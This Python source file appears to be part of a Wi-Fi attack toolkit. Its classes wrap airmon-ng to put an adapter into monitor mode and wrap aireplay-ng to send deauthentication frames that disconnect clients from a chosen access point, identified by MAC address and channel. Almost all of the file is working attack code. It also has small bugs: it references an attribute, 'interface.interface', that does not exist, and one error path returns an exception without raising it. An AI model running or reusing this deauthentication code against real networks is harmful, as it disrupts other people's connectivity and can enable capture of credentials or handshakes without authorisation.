from modules import *
class Interface:
    def __init__(self,adapter:str,channel:str or str(int)=None) -> None:
        self.adapter = adapter
        self.channel = channel
    def start(self,channel:str or str(int)=None,mode:str=None) -> None:
        if mode == "monitor" or not mode:
            info(f"Starting {self.adapter}{f' on channel {channel if channel and not channel==self.channel else self.channel}' if channel or self.channel else ''}")
            try:
                out = subprocess.check_output(["sudo","airmon-ng", "start",self.adapter,channel if channel else self.channel if self.channel else '']).decode()
            except Exception as e:
                raise Exception(error(f"{self.adapter} {f'on channel {channel if channel and not channel==self.channel else self.channel} ' if channel or self.channel else ''}could not be started! \n{e}"))
            if f"monitor mode vif enabled" in out:
                success(f"Started {self.adapter}{f' on channel {channel if channel and not channel==self.channel else self.channel} ' if channel or self.channel else ''}")
            self.adapter = self.adapter + "mon" if "mon" not in self.adapter else self.adapter
            self.channel=channel if not channel == self.channel else self.channel
        elif mode == "managed":
            if "mon" in self.adapter:
                info(f"Stopping {self.adapter} Monitor mode")
                try:
                    out = subprocess.check_output(["sudo","airmon-ng","stop",self.adapter]).decode()
                except:
                    return Exception(error(f'ERR: ["airmon-ng","stop",{self.adapter}] FAILED'))
                if f"monitor mode vif disabled" in out:
                    success(f"Stopped {self.adapter}")
                self.adapter = self.adapter.replace("mon","")
    def stop(self):
        self.start(mode="managed")
class WifiNetwork:
    def __init__(self,MAC:str,channel:str or str(int),name:str) -> None:
        self.MAC = MAC
        self.channel = channel
        self.name = name
    def configure_interface(self,interface:Interface) -> None:
        interface.start(self.channel)
    def Deauth(self,interface:Interface,amount:int=1) -> None:
        self.configure_interface(interface)
        info(f"DeAuthing {self.MAC} {self.channel} on interface {interface.interface}")
        out=None
        try:
            out=subprocess.check_output(["sudo","aireplay-ng", "-0", str(amount), "-a", self.MAC, interface.adapter])
        except Exception as e:
            print(error(f"DeAuth on {self.MAC} {self.channel} on interface {interface.interface} Failed!{RESET}\n{e}"))
        if out:
            if f"Sending DeAuth (code 7) to broadcast" in out.decode():
                success(f"DeAuth Sent!")